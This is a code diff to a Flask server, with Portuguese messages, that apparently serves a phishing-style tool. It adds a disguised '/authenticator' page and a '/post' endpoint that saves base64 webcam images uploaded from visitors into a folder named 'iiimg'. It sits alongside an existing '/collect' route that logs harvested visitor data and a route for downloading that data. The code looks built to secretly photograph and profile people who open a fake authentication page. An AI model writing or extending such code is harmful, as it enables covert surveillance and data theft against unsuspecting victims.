@@ -4,7 +4,17 @@ import json
 import os
 from datetime import datetime
 
+import re
+import base64
+
 app = Flask(__name__)
+
+# -- cam ----------------------------------------------
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+SAVE_FOLDER = os.path.join(BASE_DIR, 'iiimg')
+if not os.path.exists(SAVE_FOLDER):
+    os.makedirs(SAVE_FOLDER)
+# -- cam ----------------------------------------------
 
 DATA_FILE = "howdy.json"
 
@@ -51,6 +61,10 @@ def download_logs():
         return send_from_directory(os.getcwd(), DATA_FILE)
     return jsonify({"error": "No data collected yet"}), 404
 
+@app.route('/authenticator')
+def authenticator():
+    return render_template('authenticator_.html')
+
 @app.route("/collect", methods=["POST"])
 def collect():
     try:
@@ -84,5 +98,37 @@ def collect():
         print(f"[!] Erro na coleta: {str(e)}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
-if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
+
+# -- cam -----------------------------------------------
+from urllib.parse import parse_qs
+
+@app.route('/post', methods=['POST'])
+def save_image():
+    try:
+        raw_data = request.get_data(as_text=True)
+        parsed_data = parse_qs(raw_data)
+
+        data = parsed_data.get('cat', [None])[0]
+        file_name = parsed_data.get('name', [None])[0]
+
+        if not data or not file_name:
+            return jsonify({'status': 'error', 'message': 'Dados ausentes'}), 400
+
+        data = re.sub(r'^data:image/.+;base64,', '', data)
+
+        image_bytes = base64.b64decode(data)
+        clean_file_name = os.path.basename(file_name)
+        file_path = os.path.join(SAVE_FOLDER, clean_file_name)
+
+        with open(file_path, 'wb') as f:
+            f.write(image_bytes)
+
+        return jsonify({'status': 'success', 'message': f'Salvo com sucesso: {clean_file_name}'}), 200
+
+    except Exception as e:
+        print(f"ERRO NO SERVIDOR: {str(e)}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+# -- cam -----------------------------------------------
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
